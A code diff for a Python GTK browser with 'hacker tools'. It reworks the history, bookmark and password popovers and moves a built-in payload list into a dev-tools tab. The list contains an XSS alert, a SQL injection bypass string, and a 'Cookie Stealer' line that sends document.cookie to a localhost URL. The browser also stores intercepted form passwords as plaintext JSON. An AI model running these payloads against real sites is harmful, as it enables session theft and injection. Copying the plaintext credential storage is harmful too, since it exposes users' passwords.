@@ -59,7 +59,7 @@ START_PAGE_HTML = """
 """
 
 SCROLLBAR_CSS = "::-webkit-scrollbar { width: 8px; height: 8px; background: #12141a; } ::-webkit-scrollbar-thumb { background: #3a3f4b; border-radius: 4px; } ::-webkit-scrollbar-thumb:hover { background: #4d90fe; } ::-webkit-scrollbar-corner { background: #12141a; }"
-COSMETIC_ADBLOCK_CSS = ".adsbygoogle, .ad-container, .ad-slot, .ad-banner, .pub_300x250, .pub_300x250m, .pub_728x90, .text-ad, .textAd, .text_ad, .text_ads, .text_ads, .text-ad-links, div[id^='div-gpt-ad-'], div[id^='google_ads_iframe_'], iframe[id^='google_ads_iframe_'], div[class*='Sponsored'], div[class*='sponsored'], div[class*='Advert'], div[class*='advert'] { display: none !important; }"
+COSMETIC_ADBLOCK_CSS = ".adsbygoogle, .ad-container, .ad-slot, .ad-banner, .pub_300x250, .pub_300x250m, .pub_728x90, .text-ad, .textAd, .text_ad, .text_ads, .text-ads, .text-ad-links, div[id^='div-gpt-ad-'], div[id^='google_ads_iframe_'], iframe[id^='google_ads_iframe_'], div[class*='Sponsored'], div[class*='sponsored'], div[class*='Advert'], div[class*='advert'] { display: none !important; }"
 
 PW_INJECT_JS = """
 document.addEventListener('submit', function(e) {
@@ -93,19 +93,12 @@ class ZeroDevBrowser(Gtk.Window):
         
         settings = Gtk.Settings.get_default()
         settings.set_property("gtk-application-prefer-dark-theme", True)
-        
         self.setup_css()
         
-        self.history_store = Gtk.ListStore(str, str) 
-        self.bookmarks_store = Gtk.ListStore(str, str)
-        self.passwords_store = Gtk.ListStore(str, str, str) # domain, user, pass
         self.tabs_map = {} 
-        
         self.bm_path = os.path.join(os.path.expanduser("~"), ".zero_bookmarks.json")
         self.pw_path = os.path.join(os.path.expanduser("~"), ".zero_passwords.json")
         self.passwords = {}
-        self.load_bookmarks()
-        self.load_passwords()
         
         self.main_vbox = Gtk.Box(orientation=Gtk.Orientation.VERTICAL)
         self.add(self.main_vbox)
@@ -117,12 +110,6 @@ class ZeroDevBrowser(Gtk.Window):
         self.header.set_title("Zero Browser")
         self.set_titlebar(self.header)
 
-        self.btn_sidebar = Gtk.ToggleButton()
-        self.btn_sidebar.add(Gtk.Image.new_from_icon_name("view-sidebar-symbolic", Gtk.IconSize.MENU))
-        self.btn_sidebar.set_tooltip_text("Toggle Data Sidebar")
-        self.btn_sidebar.connect("toggled", self.on_sidebar_toggled)
-        self.header.pack_start(self.btn_sidebar)
-        
         self.btn_tabs = Gtk.ToggleButton()
         self.btn_tabs.set_active(True)
         self.btn_tabs.add(Gtk.Image.new_from_icon_name("format-justify-left-symbolic", Gtk.IconSize.MENU))
@@ -135,10 +122,15 @@ class ZeroDevBrowser(Gtk.Window):
         btn_back.connect("clicked", lambda b: self.current_webview.go_back() if hasattr(self, 'current_webview') else None)
         btn_forward.connect("clicked", lambda b: self.current_webview.go_forward() if hasattr(self, 'current_webview') else None)
         for b in (btn_back, btn_forward): self.header.pack_start(b)
+        
+        self.btn_open_file = Gtk.Button()
+        self.btn_open_file.add(Gtk.Image.new_from_icon_name("document-open-symbolic", Gtk.IconSize.MENU))
+        self.btn_open_file.set_tooltip_text("Open Local File (PDF/HTML)")
+        self.btn_open_file.connect("clicked", self.on_open_file)
+        self.header.pack_start(self.btn_open_file)
 
         # Center Search / URL Bar
         center_box = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL, spacing=2)
-        
         self.search_engine_combo = Gtk.ComboBoxText()
         self.search_engine_combo.append("google", "Google")
         self.search_engine_combo.append("ddg", "DuckDuckGo")
@@ -156,63 +148,42 @@ class ZeroDevBrowser(Gtk.Window):
         center_box.pack_start(self.url_bar, True, True, 0)
         self.header.set_custom_title(center_box)
 
-        # Download Manager Popover
-        self.btn_downloads = Gtk.ToggleButton()
-        self.btn_downloads.add(Gtk.Image.new_from_icon_name("folder-download-symbolic", Gtk.IconSize.MENU))
-        self.btn_downloads.set_tooltip_text("Downloads")
-        self.header.pack_end(self.btn_downloads)
+        # POPOVERS
+        self.build_downloads_popover()
+        self.build_bookmarks_popover()
+        self.build_history_popover()
+        self.build_passwords_popover()
         
-        self.downloads_popover = Gtk.Popover()
-        self.downloads_popover.set_relative_to(self.btn_downloads)
-        self.downloads_list = Gtk.ListBox()
-        self.downloads_list.set_selection_mode(Gtk.SelectionMode.NONE)
-        dl_scroll = Gtk.ScrolledWindow()
-        dl_scroll.set_size_request(350, 400)
-        dl_scroll.add(self.downloads_list)
-        self.downloads_popover.add(dl_scroll)
-        self.btn_downloads.connect("toggled", lambda b: self.downloads_popover.popup() if b.get_active() else self.downloads_popover.popdown())
-        self.downloads_popover.connect("closed", lambda p: self.btn_downloads.set_active(False))
+        self.load_bookmarks()
+        self.load_passwords()
 
         self.btn_pip = Gtk.Button()
         self.btn_pip.add(Gtk.Image.new_from_icon_name("media-playback-start-symbolic", Gtk.IconSize.MENU))
-        self.btn_pip.set_tooltip_text("Picture-in-Picture (Pop out video)")
+        self.btn_pip.set_tooltip_text("Picture-in-Picture")
         self.btn_pip.connect("clicked", self.on_pip_toggled)
         self.header.pack_end(self.btn_pip)
 
         self.btn_screenshot = Gtk.Button()
         self.btn_screenshot.add(Gtk.Image.new_from_icon_name("camera-photo-symbolic", Gtk.IconSize.MENU))
-        self.btn_screenshot.set_tooltip_text("Screenshot Page (Full)")
+        self.btn_screenshot.set_tooltip_text("Screenshot")
         self.btn_screenshot.connect("clicked", self.on_take_screenshot)
         self.header.pack_end(self.btn_screenshot)
-
-        self.btn_bookmark = Gtk.Button()
-        self.btn_bookmark.add(Gtk.Image.new_from_icon_name("bookmark-new-symbolic", Gtk.IconSize.MENU))
-        self.btn_bookmark.set_tooltip_text("Bookmark Current Page")
-        self.btn_bookmark.connect("clicked", self.on_add_bookmark)
-        self.header.pack_end(self.btn_bookmark)
         
         self.btn_devtools = Gtk.ToggleButton()
         self.btn_devtools.add(Gtk.Image.new_from_icon_name("preferences-system-symbolic", Gtk.IconSize.MENU))
-        self.btn_devtools.set_tooltip_text("Toggle Hacker Tools")
+        self.btn_devtools.set_tooltip_text("Hacker Tools")
         self.btn_devtools.connect("toggled", self.on_devtools_toggled)
         self.header.pack_end(self.btn_devtools)
 
         self.btn_newtab = Gtk.Button()
         self.btn_newtab.add(Gtk.Image.new_from_icon_name("tab-new-symbolic", Gtk.IconSize.MENU))
-        self.btn_newtab.set_tooltip_text("New Tab (Ctrl+T)")
+        self.btn_newtab.set_tooltip_text("New Tab")
         self.btn_newtab.connect("clicked", lambda b: self.new_tab("zero://start"))
         self.header.pack_end(self.btn_newtab)
 
         # ================= LAYOUT =================
-        self.hpaned_main = Gtk.Paned(orientation=Gtk.Orientation.HORIZONTAL)
-        self.main_vbox.pack_start(self.hpaned_main, True, True, 0)
-        
-        self.sidebar_revealer = Gtk.Revealer(); self.sidebar_revealer.set_transition_type(Gtk.RevealerTransitionType.SLIDE_RIGHT); self.sidebar_revealer.set_reveal_child(False)
-        self.sidebar_box = self.build_sidebar(); self.sidebar_revealer.add(self.sidebar_box)
-        self.hpaned_main.pack1(self.sidebar_revealer, False, False)
-        
         self.hpaned_workspace = Gtk.Paned(orientation=Gtk.Orientation.HORIZONTAL)
-        self.hpaned_main.pack2(self.hpaned_workspace, True, False)
+        self.main_vbox.pack_start(self.hpaned_workspace, True, True, 0)
         
         self.tabs_revealer = Gtk.Revealer(); self.tabs_revealer.set_transition_type(Gtk.RevealerTransitionType.SLIDE_RIGHT); self.tabs_revealer.set_reveal_child(True)
         self.tabs_box = self.build_tabs_sidebar(); self.tabs_revealer.add(self.tabs_box)
@@ -245,6 +216,80 @@ class ZeroDevBrowser(Gtk.Window):
         self.adblock_enabled = True
         self.new_tab("zero://start")
 
+    # ================= POPOVERS =================
+    def build_downloads_popover(self):
+        self.btn_downloads = Gtk.ToggleButton()
+        self.btn_downloads.add(Gtk.Image.new_from_icon_name("folder-download-symbolic", Gtk.IconSize.MENU))
+        self.header.pack_end(self.btn_downloads)
+        self.downloads_popover = Gtk.Popover(); self.downloads_popover.set_relative_to(self.btn_downloads)
+        self.downloads_list = Gtk.ListBox(); self.downloads_list.set_selection_mode(Gtk.SelectionMode.NONE)
+        scroll = Gtk.ScrolledWindow(); scroll.set_size_request(350, 400); scroll.add(self.downloads_list); self.downloads_popover.add(scroll)
+        self.btn_downloads.connect("toggled", lambda b: self.downloads_popover.popup() if b.get_active() else self.downloads_popover.popdown())
+        self.downloads_popover.connect("closed", lambda p: self.btn_downloads.set_active(False))
+
+    def build_history_popover(self):
+        self.btn_history = Gtk.ToggleButton()
+        self.btn_history.add(Gtk.Image.new_from_icon_name("document-open-recent-symbolic", Gtk.IconSize.MENU))
+        self.header.pack_end(self.btn_history)
+        self.history_popover = Gtk.Popover(); self.history_popover.set_relative_to(self.btn_history)
+        self.history_list = Gtk.ListBox(); self.history_list.connect("row-activated", self.on_popover_row_clicked)
+        scroll = Gtk.ScrolledWindow(); scroll.set_size_request(300, 300); scroll.add(self.history_list); self.history_popover.add(scroll)
+        self.btn_history.connect("toggled", lambda b: self.history_popover.popup() if b.get_active() else self.history_popover.popdown())
+        self.history_popover.connect("closed", lambda p: self.btn_history.set_active(False))
+
+    def build_bookmarks_popover(self):
+        self.btn_bookmark = Gtk.ToggleButton()
+        self.btn_bookmark.add(Gtk.Image.new_from_icon_name("bookmark-new-symbolic", Gtk.IconSize.MENU))
+        self.header.pack_end(self.btn_bookmark)
+        self.bookmarks_popover = Gtk.Popover(); self.bookmarks_popover.set_relative_to(self.btn_bookmark)
+        box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL)
+        
+        btn_add = Gtk.Button(label="Bookmark Current Page")
+        btn_add.connect("clicked", self.on_add_bookmark)
+        box.pack_start(btn_add, False, False, 5)
+        
+        self.bookmarks_list = Gtk.ListBox(); self.bookmarks_list.connect("row-activated", self.on_popover_row_clicked)
+        scroll = Gtk.ScrolledWindow(); scroll.set_size_request(300, 300); scroll.add(self.bookmarks_list); box.pack_start(scroll, True, True, 0)
+        self.bookmarks_popover.add(box)
+        self.btn_bookmark.connect("toggled", lambda b: self.bookmarks_popover.popup() if b.get_active() else self.bookmarks_popover.popdown())
+        self.bookmarks_popover.connect("closed", lambda p: self.btn_bookmark.set_active(False))
+
+    def build_passwords_popover(self):
+        self.btn_passwords = Gtk.ToggleButton()
+        self.btn_passwords.add(Gtk.Image.new_from_icon_name("dialog-password-symbolic", Gtk.IconSize.MENU))
+        self.header.pack_end(self.btn_passwords)
+        self.passwords_popover = Gtk.Popover(); self.passwords_popover.set_relative_to(self.btn_passwords)
+        self.passwords_list = Gtk.ListBox(); self.passwords_list.set_selection_mode(Gtk.SelectionMode.NONE)
+        scroll = Gtk.ScrolledWindow(); scroll.set_size_request(300, 300); scroll.add(self.passwords_list); self.passwords_popover.add(scroll)
+        self.btn_passwords.connect("toggled", lambda b: self.passwords_popover.popup() if b.get_active() else self.passwords_popover.popdown())
+        self.passwords_popover.connect("closed", lambda p: self.btn_passwords.set_active(False))
+
+    def add_to_popover(self, listbox, main_text, sub_text, icon_name):
+        row = Gtk.ListBoxRow(); hbox = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL, spacing=10); hbox.set_margin_top(5); hbox.set_margin_bottom(5); hbox.set_margin_start(10)
+        icon = Gtk.Image.new_from_icon_name(icon_name, Gtk.IconSize.MENU)
+        vbox = Gtk.Box(orientation=Gtk.Orientation.VERTICAL)
+        l1 = Gtk.Label(label=main_text); l1.set_halign(Gtk.Align.START); l1.set_ellipsize(Pango.EllipsizeMode.END); l1.set_max_width_chars(30)
+        l2 = Gtk.Label(label=sub_text); l2.set_halign(Gtk.Align.START); l2.set_ellipsize(Pango.EllipsizeMode.END); l2.set_max_width_chars(30); l2.get_style_context().add_class("dim-label")
+        vbox.pack_start(l1, False, False, 0); vbox.pack_start(l2, False, False, 0)
+        hbox.pack_start(icon, False, False, 0); hbox.pack_start(vbox, True, True, 0)
+        row.add(hbox); row.show_all()
+        row.url_data = sub_text
+        listbox.insert(row, 0)
+
+    def on_popover_row_clicked(self, listbox, row):
+        if hasattr(row, 'url_data'):
+            self.url_bar.set_text(row.url_data)
+            self.on_url_activate(self.url_bar)
+            if listbox == self.history_list: self.btn_history.set_active(False)
+            if listbox == self.bookmarks_list: self.btn_bookmark.set_active(False)
+
+    def on_open_file(self, btn):
+        dialog = Gtk.FileChooserNative.new("Open File", self, Gtk.FileChooserAction.OPEN, "_Open", "_Cancel")
+        if dialog.run() == Gtk.ResponseType.ACCEPT:
+            uri = dialog.get_uri()
+            if hasattr(self, 'current_webview'): self.current_webview.load_uri(uri)
+        dialog.destroy()
+
     def on_password_intercepted(self, manager, js_result):
         try:
             data = json.loads(js_result.get_js_value().to_string())
@@ -264,13 +309,38 @@ class ZeroDevBrowser(Gtk.Window):
                 with open(self.pw_path, 'r') as f:
                     self.passwords = json.load(f)
                     for domain, cred in self.passwords.items():
-                        self.passwords_store.append([domain, cred['user'], "***"])
+                        self.add_to_popover(self.passwords_list, domain, f"{cred['user']} / ***", "dialog-password-symbolic")
             except: pass
 
     def save_passwords(self):
         with open(self.pw_path, 'w') as f: json.dump(self.passwords, f)
-        self.passwords_store.clear()
-        for domain, cred in self.passwords.items(): self.passwords_store.append([domain, cred['user'], "***"])
+        for c in self.passwords_list.get_children(): self.passwords_list.remove(c)
+        for domain, cred in self.passwords.items(): self.add_to_popover(self.passwords_list, domain, f"{cred['user']} / ***", "dialog-password-symbolic")
+
+    def load_bookmarks(self):
+        if os.path.exists(self.bm_path):
+            try:
+                with open(self.bm_path, 'r') as f:
+                    for title, url in json.load(f): self.add_to_popover(self.bookmarks_list, title, url, "bookmark-new-symbolic")
+            except: pass
+
+    def save_bookmarks(self):
+        bookmarks = []
+        for row in self.bookmarks_list.get_children():
+            vbox = row.get_child().get_children()[1]
+            title = vbox.get_children()[0].get_text()
+            url = row.url_data
+            bookmarks.append([title, url])
+        with open(self.bm_path, 'w') as f: json.dump(bookmarks, f)
+
+    def on_add_bookmark(self, btn):
+        if hasattr(self, 'current_webview'):
+            uri = self.current_webview.get_uri()
+            if uri and not uri.startswith("zero://"):
+                title = self.current_webview.get_title() or "Untitled"
+                self.add_to_popover(self.bookmarks_list, title, uri, "bookmark-new-symbolic")
+                self.save_bookmarks()
+                self.btn_bookmark.set_active(False)
 
     def on_key_press(self, widget, event):
         if event.state & Gdk.ModifierType.CONTROL_MASK:
@@ -329,40 +399,7 @@ class ZeroDevBrowser(Gtk.Window):
             if children: self.tab_listbox.select_row(children[0]); self.on_tab_clicked(self.tab_listbox, children[0])
             else: self.new_tab("zero://start")
 
-    def load_bookmarks(self):
-        if os.path.exists(self.bm_path):
-            try:
-                with open(self.bm_path, 'r') as f:
-                    for title, url in json.load(f): self.bookmarks_store.append([title, url])
-            except: pass
-    def save_bookmarks(self):
-        with open(self.bm_path, 'w') as f: json.dump([[r[0], r[1]] for r in self.bookmarks_store], f)
-    def on_add_bookmark(self, btn):
-        if hasattr(self, 'current_webview'):
-            uri = self.current_webview.get_uri()
-            if uri and not uri.startswith("zero://"):
-                self.bookmarks_store.append([self.current_webview.get_title() or "Untitled", uri]); self.save_bookmarks()
-                btn.set_image(Gtk.Image.new_from_icon_name("emblem-ok-symbolic", Gtk.IconSize.MENU))
-                GLib.timeout_add(1000, lambda: btn.set_image(Gtk.Image.new_from_icon_name("bookmark-new-symbolic", Gtk.IconSize.MENU)) and False)
-    def on_sidebar_toggled(self, btn): self.sidebar_revealer.set_reveal_child(btn.get_active())
     def on_devtools_toggled(self, btn): self.devtools_revealer.set_reveal_child(btn.get_active())
-
-    def build_sidebar(self):
-        box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL); box.set_size_request(250, -1)
-        nb = Gtk.Notebook(); nb.set_tab_pos(Gtk.PositionType.BOTTOM)
-        bm_tree = Gtk.TreeView(model=self.bookmarks_store); r_bm = Gtk.CellRendererText(); bm_tree.append_column(Gtk.TreeViewColumn("Title", r_bm, text=0)); bm_tree.connect("row-activated", self.on_history_activated); scroll0 = Gtk.ScrolledWindow(); scroll0.add(bm_tree); nb.append_page(scroll0, Gtk.Label(label="Bookmarks"))
-        hist_tree = Gtk.TreeView(model=self.history_store); renderer = Gtk.CellRendererText(); hist_tree.append_column(Gtk.TreeViewColumn("Time", renderer, text=0)); hist_tree.append_column(Gtk.TreeViewColumn("URL", renderer, text=1)); hist_tree.connect("row-activated", self.on_history_activated); scroll1 = Gtk.ScrolledWindow(); scroll1.add(hist_tree); nb.append_page(scroll1, Gtk.Label(label="History"))
-        
-        pw_tree = Gtk.TreeView(model=self.passwords_store); r3 = Gtk.CellRendererText()
-        pw_tree.append_column(Gtk.TreeViewColumn("Domain", r3, text=0)); pw_tree.append_column(Gtk.TreeViewColumn("User", r3, text=1))
-        scroll4 = Gtk.ScrolledWindow(); scroll4.add(pw_tree); nb.append_page(scroll4, Gtk.Label(label="Passwords"))
-
-        plist = Gtk.ListBox()
-        for title, p in [("XSS Alert", "javascript:alert(1)"), ("SQLi Bypass", "' OR '1'='1"), ("Cookie Stealer", "javascript:fetch('http://localhost/?c='+document.cookie)")]:
-            row = Gtk.ListBoxRow(); v = Gtk.Box(orientation=Gtk.Orientation.VERTICAL); lt = Gtk.Label(label=title); lt.set_halign(Gtk.Align.START); lt.get_style_context().add_class("bold-label"); lp = Gtk.Label(label=p); lp.set_halign(Gtk.Align.START); lp.set_line_wrap(True); v.pack_start(lt, False, False, 2); v.pack_start(lp, False, False, 2); row.add(v); plist.add(row)
-        plist.connect("row-activated", self.on_payload_activated); scroll3 = Gtk.ScrolledWindow(); scroll3.add(plist); nb.append_page(scroll3, Gtk.Label(label="Exploits"))
-        box.pack_start(nb, True, True, 0)
-        return box
 
     def build_devtools(self):
         box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL); box.set_size_request(-1, 280)
@@ -374,13 +411,21 @@ class ZeroDevBrowser(Gtk.Window):
         sec_box = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL, spacing=5)
         self.btn_adblock = Gtk.ToggleButton(label="Adblock ON"); self.btn_adblock.set_active(True); self.btn_adblock.connect("toggled", self.on_adblock_toggled); sec_box.pack_start(self.btn_adblock, False, False, 0)
         self.ua_combo = Gtk.ComboBoxText(); self.ua_combo.append("default", "Standard UA"); self.ua_combo.append("mobile", "Mobile (iPhone)"); self.ua_combo.append("bot", "Googlebot"); self.ua_combo.set_active(0); self.ua_combo.connect("changed", self.on_ua_changed); sec_box.pack_end(self.ua_combo, False, False, 0)
-        self.btn_webrtc = Gtk.ToggleButton(label="WebRTC Leak"); self.btn_webrtc.connect("toggled", self.on_webrtc_toggled); self.btn_cors = Gtk.ToggleButton(label="CORS Strict"); self.btn_cors.connect("toggled", self.on_cors_toggled); sec_box.pack_end(self.btn_cors, False, False, 0); sec_box.pack_end(self.btn_webrtc, False, False, 0)
         
         ti_sec = Gtk.ToolItem(); ti_sec.set_expand(True); ti_sec.add(sec_box); toolbar.insert(ti_sec, 1)
         box.pack_start(toolbar, False, False, 0); box.pack_start(self.dev_stack, True, True, 0)
         
         self.dev_stack.add_titled(self.build_js_console(), "js", "JS Console"); self.dev_stack.add_titled(self.build_network_panel(), "network", "Network"); self.dev_stack.add_titled(self.build_cookie_explorer(), "cookies", "Cookies"); self.dev_stack.add_titled(self.build_storage_explorer(), "storage", "Storage"); self.dev_stack.add_titled(self.build_source_viewer(), "source", "DOM Source"); self.dev_stack.add_titled(self.build_css_panel(), "css", "CSS Inject"); self.dev_stack.add_titled(self.build_terminal_emulator(), "term", "Python Term")
         self.dev_stack.connect("notify::visible-child", self.on_dev_stack_changed)
+        
+        # Add Exploits Payload tab to DevTools instead of sidebar
+        plist = Gtk.ListBox()
+        for title, p in [("XSS Alert", "javascript:alert(1)"), ("SQLi Bypass", "' OR '1'='1"), ("Cookie Stealer", "javascript:fetch('http://localhost/?c='+document.cookie)")]:
+            row = Gtk.ListBoxRow(); v = Gtk.Box(orientation=Gtk.Orientation.VERTICAL); lt = Gtk.Label(label=title); lt.set_halign(Gtk.Align.START); lt.get_style_context().add_class("bold-label"); lp = Gtk.Label(label=p); lp.set_halign(Gtk.Align.START); lp.set_line_wrap(True); v.pack_start(lt, False, False, 2); v.pack_start(lp, False, False, 2); row.add(v); plist.add(row)
+        plist.connect("row-activated", lambda lb, r: self.current_webview.run_javascript(r.get_child().get_children()[1].get_text()[11:], None, None, None) if hasattr(self, 'current_webview') and r.get_child().get_children()[1].get_text().startswith("javascript:") else None)
+        scroll = Gtk.ScrolledWindow(); scroll.add(plist)
+        self.dev_stack.add_titled(scroll, "payloads", "Payloads")
+        
         return box
 
     def on_adblock_toggled(self, btn):
@@ -400,15 +445,6 @@ class ZeroDevBrowser(Gtk.Window):
         if name == "cookies": self.refresh_cookies()
         elif name == "storage": self.refresh_storage()
         elif name == "source": self.on_fetch_source(None)
-
-    def on_history_activated(self, treeview, path, column):
-        self.url_bar.set_text(treeview.get_model()[path][1]); self.on_url_activate(self.url_bar)
-        
-    def on_payload_activated(self, listbox, row):
-        payload = row.get_child().get_children()[1].get_text(); url = self.url_bar.get_text()
-        if payload.startswith("javascript:"):
-            if hasattr(self, 'current_webview'): self.current_webview.run_javascript(payload[11:], None, None, None)
-        else: self.url_bar.set_text(url + payload); self.url_bar.grab_focus()
 
     def on_download_started(self, context, download):
         filename = download.get_request().get_uri().split("/")[-1] or "downloaded_file"
@@ -577,7 +613,9 @@ class ZeroDevBrowser(Gtk.Window):
         def on_uri(w, p):
             uri = w.get_uri() or ""
             if self.current_webview == w: self.url_bar.set_text(uri)
-            if uri != "zero://start" and not uri.startswith("about:"): self.history_store.append([datetime.now().strftime("%H:%M"), uri])
+            if uri != "zero://start" and not uri.startswith("about:"): 
+                title = w.get_title() or "Untitled"
+                self.add_to_popover(self.history_list, title, uri, "text-html-symbolic")
             
         def on_title(w, p):
             title = w.get_title() or "Untitled"
@@ -601,7 +639,10 @@ class ZeroDevBrowser(Gtk.Window):
         if url == "zero://start":
             if hasattr(self, 'current_webview'): self.current_webview.load_html(START_PAGE_HTML, "zero://start")
             return
-        if not url.startswith("http") and not url.startswith("zero://"): 
+            
+        if url.startswith("/"):
+            if os.path.exists(url): url = "file://" + os.path.abspath(url)
+        elif not url.startswith("http") and not url.startswith("zero://") and not url.startswith("file://"): 
             if "." in url and " " not in url:
                 url = "https://" + url
             else:
@@ -612,6 +653,7 @@ class ZeroDevBrowser(Gtk.Window):
     def setup_css(self):
         css = b'''
             .bold-label { font-weight: bold; }
+            .dim-label { color: #888888; font-size: 11px; }
             .vertical-tabs-box { background: #16181D; border-right: 1px solid rgba(255,255,255,0.05); }
             .tabs-header { color: #8090A0; font-size: 11px; font-weight: bold; letter-spacing: 1px; }
             .vertical-tabs-list { background: transparent; }
